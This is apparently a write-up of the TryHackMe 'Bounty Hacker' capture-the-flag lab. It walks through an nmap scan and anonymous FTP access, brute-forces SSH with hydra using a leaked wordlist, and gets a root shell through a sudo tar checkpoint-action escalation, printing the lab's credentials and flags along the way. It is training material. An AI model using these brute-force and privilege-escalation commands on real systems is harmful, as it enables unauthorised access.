---
title: Bounty Hacker
date: 2022-05-27 17:00:00 +500
categories: [THM, easy machines]
tags: []    # TAG names should always be lowercase
---



### Find open ports on the machine

run a quick Nmap scan:

```terminal
nmap -p- -sS --min-rate 10000 --open -vvv -n -Pn 10.10.101.89 
```

```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 60
22/tcp open  ssh     syn-ack ttl 60
80/tcp open  http    syn-ack ttl 60
```

### Who wrote the task list? 

Let's start checking the ftp server, I tried to login with Anonymous and I had success, they where only 2 files, locks.txt and task.txt

locks.txt
```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

this file seems to be a list of possible usernames, or perhaps passwords.

task.txt
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

not sure what those tasks mean. but we have the answer:

> lin

### What service can you bruteforce with the text file found?

I take a guess and I think it's gonna be the ssh service since it says service, and not some login page in the webserver which after a quick look to /login and /login.php did not found a page.

so let's prepare the hydra command to bruteforce the service.

```terminal
hydra -l lin -P locks.txt 10.10.101.89 ssh
```

and we got a winner!  'RedDr4gonSynd1cat3'

### What is the users password? 

> RedDr4gonSynd1cat3

### user.txt

login to the ssh service with the credentials we got, and cat the file on lin's directory:

> THM{CR1M3_SyNd1C4T3}

### root.txt

run 'sudo -l' to see what we can run as sudo, and we have something '/bin/tar', let's head over to gtfobins to the if there's a way to get a root shell taking advantage of this.

```terminal
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

and we got ourselves a shell!
now just cat the file on /root directory.

> THM{80UN7Y_h4cK3r}